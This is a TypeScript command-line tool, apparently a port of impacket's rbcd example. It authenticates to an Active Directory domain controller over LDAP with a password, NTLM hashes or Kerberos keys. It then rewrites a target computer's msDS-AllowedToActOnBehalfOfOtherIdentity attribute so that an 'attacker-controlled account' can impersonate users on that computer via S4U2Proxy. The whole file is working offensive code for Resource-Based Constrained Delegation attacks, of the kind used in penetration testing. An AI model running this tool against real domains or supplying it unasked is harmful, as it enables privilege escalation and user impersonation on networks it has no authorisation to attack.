#!/usr/bin/env node
/**
 * jspacket - rbcd
 *
 * (Re)setter for the msDS-AllowedToActOnBehalfOfOtherIdentity property of a
 * target computer, used for Resource-Based Constrained Delegation (RBCD)
 * attacks. Reads, writes, removes or flushes the accounts allowed to act on
 * behalf of other identities against the target.
 *
 * Python implementation by Remi Gascou (@podalirius_) and Charlie Bromberg
 * (@_nwodtuhs). TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { parseArgs } from 'node:util';

import {
  parseTarget,
  init as initLogger,
  initProxy,
  info,
  error as logError,
  debug as logDebug,
  critical,
  getLevel,
  LogLevel,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';

import {
  LDAPConnection,
  LDAPSessionError,
  Scope,
  Operation,
  SR_SECURITY_DESCRIPTOR,
  ACL,
  ACE,
  ACCESS_ALLOWED_ACE,
  ACCESS_MASK,
  LDAP_SID,
  type SearchResultEntry,
} from '@impacket/ldap';

const RBCD_ATTR = 'msDS-AllowedToActOnBehalfOfOtherIdentity';

// ---------- security-descriptor helpers ----------

/** Build an empty security descriptor with a BUILTIN\Administrators owner. */
function createEmptySD(): SR_SECURITY_DESCRIPTOR {
  const sd = new SR_SECURITY_DESCRIPTOR();
  // 'c' fields pack a number/char (a Buffer would serialize as 0).
  sd.set('Revision', 1);
  sd.set('Sbz1', 0);
  sd.set('Control', 32772);
  const owner = new LDAP_SID();
  owner.fromCanonical('S-1-5-32-544'); // BUILTIN\Administrators
  sd.set('OwnerSid', owner);
  sd.set('GroupSid', Buffer.alloc(0));
  sd.set('Sacl', Buffer.alloc(0));
  const acl = new ACL();
  acl.set('AclRevision', 4);
  acl.set('Sbz1', 0);
  acl.set('Sbz2', 0);
  acl.aces = [];
  sd.set('Dacl', acl);
  return sd;
}

/** Build an ALLOW ACE granting full control to the given SID. */
function createAllowAce(sidStr: string): ACE {
  const nace = new ACE();
  nace.set('AceType', ACCESS_ALLOWED_ACE.ACE_TYPE);
  nace.set('AceFlags', 0x00);
  const acedata = new ACCESS_ALLOWED_ACE();
  const mask = new ACCESS_MASK();
  mask.set('Mask', 983551); // Full control
  acedata.set('Mask', mask);
  const sid = new LDAP_SID();
  sid.fromCanonical(sidStr);
  acedata.set('Sid', sid);
  nace.aceData = acedata;
  return nace;
}

/** Extract the SID (canonical string) from an already-parsed ALLOW ace. */
function aceSid(ace: ACE): string {
  const inner = ace.aceData as ACCESS_ALLOWED_ACE;
  const sid = inner.get('Sid') as LDAP_SID;
  return sid.formatCanonical();
}

/** First value of a named attribute on a search entry, as a Buffer. */
function attrBuf(entry: SearchResultEntry, name: string): Buffer | null {
  const attr = entry.attributes.find((a) => a.type.toLowerCase() === name.toLowerCase());
  if (!attr || attr.vals.length === 0) return null;
  const v = attr.vals[0]!;
  return Buffer.isBuffer(v) ? v : Buffer.from(v, 'binary');
}

// ---------- RBCD ----------

type Action = 'read' | 'write' | 'remove' | 'flush';

class RBCD {
  private ldapConn: LDAPConnection;
  private baseDN: string;
  private delegateTo: string;
  private dnDelegateTo = '';

  constructor(ldapConn: LDAPConnection, baseDN: string, delegateTo: string) {
    this.ldapConn = ldapConn;
    this.baseDN = baseDN;
    this.delegateTo = delegateTo;
  }

  /** Resolve a sAMAccountName to [dn, sidString], or null if not found. */
  private async getUserInfo(samName: string): Promise<[string, string] | null> {
    const entries = await this.ldapConn.search({
      searchBase: this.baseDN,
      searchFilter: `(sAMAccountName=${samName})`,
      attributes: ['objectSid'],
    });
    if (entries.length === 0) {
      logError(`User not found in LDAP: ${samName}`);
      return null;
    }
    const sidBuf = attrBuf(entries[0]!, 'objectSid');
    if (sidBuf === null) {
      logError(`User has no objectSid: ${samName}`);
      return null;
    }
    return [entries[0]!.objectName, new LDAP_SID(sidBuf).formatCanonical()];
  }

  /** Resolve a SID to its sAMAccountName, or null if not found. */
  private async getSidInfo(sidStr: string): Promise<string | null> {
    const entries = await this.ldapConn.search({
      searchBase: this.baseDN,
      searchFilter: `(objectSid=${sidStr})`,
      attributes: ['sAMAccountName'],
    });
    if (entries.length === 0) return null;
    const nameBuf = attrBuf(entries[0]!, 'sAMAccountName');
    return nameBuf ? nameBuf.toString('utf8') : null;
  }

  /**
   * Read the target's current RBCD security descriptor and print the accounts
   * allowed to act on its behalf. Returns [sd, targetEntry].
   */
  private async getAllowedToAct(): Promise<[SR_SECURITY_DESCRIPTOR, SearchResultEntry] | null> {
    const entries = await this.ldapConn.search({
      searchBase: this.dnDelegateTo,
      scope: Scope.baseObject,
      searchFilter: '(objectClass=*)',
      attributes: ['sAMAccountName', 'objectSid', RBCD_ATTR],
    });
    if (entries.length === 0) {
      logError('Could not query target user properties');
      return null;
    }
    const target = entries[0]!;

    const rawSd = attrBuf(target, RBCD_ATTR);
    let sd: SR_SECURITY_DESCRIPTOR;
    if (rawSd === null) {
      sd = createEmptySD();
      info(`Attribute ${RBCD_ATTR} is empty`);
    } else {
      sd = new SR_SECURITY_DESCRIPTOR(rawSd);
      const dacl = sd.get('Dacl');
      const aces = dacl instanceof ACL ? dacl.aces : [];
      if (aces.length > 0) {
        info('Accounts allowed to act on behalf of other identity:');
        for (const ace of aces) {
          const sidStr = aceSid(ace);
          const samName = (await this.getSidInfo(sidStr)) ?? '(unknown)';
          info(`    ${samName.padEnd(20)} (${sidStr})`);
        }
      } else {
        info(`Attribute ${RBCD_ATTR} is empty`);
      }
    }
    return [sd, target];
  }

  private async resolveTargetDN(): Promise<boolean> {
    const result = await this.getUserInfo(this.delegateTo);
    if (result === null) {
      logError('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)');
      return false;
    }
    this.dnDelegateTo = result[0];
    return true;
  }

  async read(): Promise<void> {
    if (!(await this.resolveTargetDN())) return;
    await this.getAllowedToAct();
  }

  async write(delegateFrom: string): Promise<void> {
    const from = await this.getUserInfo(delegateFrom);
    if (from === null) {
      logError('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)');
      return;
    }
    const sidDelegateFrom = from[1];

    if (!(await this.resolveTargetDN())) return;

    const got = await this.getAllowedToAct();
    if (got === null) return;
    const [sd, target] = got;

    const dacl = sd.get('Dacl') instanceof ACL ? (sd.get('Dacl') as ACL) : createEmptySD().get('Dacl') as ACL;
    if (!(sd.get('Dacl') instanceof ACL)) sd.set('Dacl', dacl);

    const already = dacl.aces.some((ace) => aceSid(ace) === sidDelegateFrom);
    if (already) {
      info(`${delegateFrom} can already impersonate users on ${this.delegateTo} via S4U2Proxy`);
      info('Not modifying the delegation rights.');
    } else {
      dacl.aces.push(createAllowAce(sidDelegateFrom));
      try {
        await this.ldapConn.modify(target.objectName, [
          { operation: Operation.replace, modification: { type: RBCD_ATTR, vals: [sd.getData()] } },
        ]);
        info('Delegation rights modified successfully!');
        info(`${delegateFrom} can now impersonate users on ${this.delegateTo} via S4U2Proxy`);
      } catch (e) {
        if (e instanceof LDAPSessionError) logError(`Could not modify object: ${e.getErrorString()}`);
        else throw e;
      }
    }
    await this.getAllowedToAct();
  }

  async remove(delegateFrom: string): Promise<void> {
    const from = await this.getUserInfo(delegateFrom);
    if (from === null) {
      logError('Account to escalate does not exist! (forgot "$" for a computer account? wrong domain?)');
      return;
    }
    const sidDelegateFrom = from[1];

    if (!(await this.resolveTargetDN())) return;

    const got = await this.getAllowedToAct();
    if (got === null) return;
    const [sd, target] = got;

    const dacl = sd.get('Dacl');
    if (dacl instanceof ACL) {
      dacl.aces = dacl.aces.filter((ace) => aceSid(ace) !== sidDelegateFrom);
    }
    try {
      await this.ldapConn.modify(target.objectName, [
        { operation: Operation.replace, modification: { type: RBCD_ATTR, vals: [sd.getData()] } },
      ]);
      info('Delegation rights modified successfully!');
    } catch (e) {
      if (e instanceof LDAPSessionError) logError(`Could not modify object: ${e.getErrorString()}`);
      else throw e;
    }
    await this.getAllowedToAct();
  }

  async flush(): Promise<void> {
    if (!(await this.resolveTargetDN())) return;

    const got = await this.getAllowedToAct();
    if (got === null) return;
    const [, target] = got;

    try {
      await this.ldapConn.modify(target.objectName, [
        { operation: Operation.replace, modification: { type: RBCD_ATTR, vals: [] } },
      ]);
      info('Delegation rights flushed successfully!');
    } catch (e) {
      if (e instanceof LDAPSessionError) logError(`Could not modify object: ${e.getErrorString()}`);
      else throw e;
    }
    await this.getAllowedToAct();
  }
}

// ---------- CLI ----------

function usage(): never {
  console.log(`(Re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for Kerberos RBCD attacks.

usage: rbcd [-h] -delegate-to TARGET [-delegate-from ACCOUNT]
            [-action {read,write,remove,flush}] [-use-ldaps] [-ts] [-debug]
            [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
            [-dc-ip ip address] [-dc-host hostname]
            identity

positional arguments:
  identity              domain.local/username[:password]

options:
  -h, --help            show this help message and exit
  -delegate-to TARGET   Target account the DACL is to be read/edited/etc.
  -delegate-from ACCOUNT
                        Attacker-controlled account to write on the rbcd
                        property of -delegate-to (only for -action write)
  -action {read,write,remove,flush}
                        Action to operate on ${RBCD_ATTR} (default: read)
  -use-ldaps            Use LDAPS instead of LDAP
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication (KRB5CCNAME ccache)
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller / KDC
  -dc-host hostname     Hostname of the domain controller to use
`);
  process.exit(1);
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));
  if (args.length === 0) usage();

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args,
      allowPositionals: true,
      options: {
        'delegate-to': { type: 'string' },
        'delegate-from': { type: 'string' },
        action: { type: 'string', default: 'read' },
        'use-ldaps': { type: 'boolean', default: false },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        'dc-ip': { type: 'string' },
        'dc-host': { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1 || !values['delegate-to']) usage();

  const action = (values.action ?? 'read') as Action;
  if (!['read', 'write', 'remove', 'flush'].includes(action)) {
    critical(`Invalid -action: ${action}`);
    process.exit(1);
  }
  if (action === 'write' && !values['delegate-from']) {
    critical('`-delegate-from` should be specified when using `-action write` !');
    process.exit(1);
  }

  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  const [domain, username, password, remoteName] = parseTarget(positionals[0]!);
  if (domain === '') {
    critical('Domain should be specified in the identity (domain.local/username[:password])!');
    process.exit(1);
  }

  let lmhash = '';
  let nthash = '';
  if (values.hashes) {
    const parts = values.hashes.split(':');
    lmhash = parts[0] ?? '';
    nthash = parts[1] ?? '';
  }

  let doKerberos = values.k ?? false;
  if (values.aesKey) doKerberos = true;

  const baseDN = domain
    .split('.')
    .map((p) => `dc=${p}`)
    .join(',');

  const kdcIp = values['dc-ip'] ?? null;
  const kdcHost = values['dc-host'] ?? null;
  const targetHost = kdcHost ?? kdcIp ?? (remoteName || domain);
  const scheme = values['use-ldaps'] ? 'ldaps' : 'ldap';
  const ldapUrl = `${scheme}://${targetHost}`;

  logDebug(`Connecting to ${ldapUrl} (baseDN: ${baseDN})`);

  const ldapConn = new LDAPConnection({
    url: ldapUrl,
    baseDN,
    dstIp: kdcIp ?? undefined,
    ...(doKerberos ? { signing: false } : {}),
  });

  try {
    await ldapConn.connect();
    if (doKerberos) {
      await ldapConn.kerberosLogin({
        user: username,
        password,
        domain,
        lmhash,
        nthash,
        aesKey: values.aesKey ?? '',
        kdcHost,
      });
    } else {
      await ldapConn.login({ user: username, password, domain, lmhash, nthash });
    }
    info(`Successfully authenticated to ${targetHost}`);

    const rbcd = new RBCD(ldapConn, baseDN, values['delegate-to']!);
    if (action === 'read') await rbcd.read();
    else if (action === 'write') await rbcd.write(values['delegate-from']!);
    else if (action === 'remove') await rbcd.remove(values['delegate-from']!);
    else if (action === 'flush') await rbcd.flush();

    ldapConn.close();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) console.error(e);
    logError(String(e));
  }
}

main();
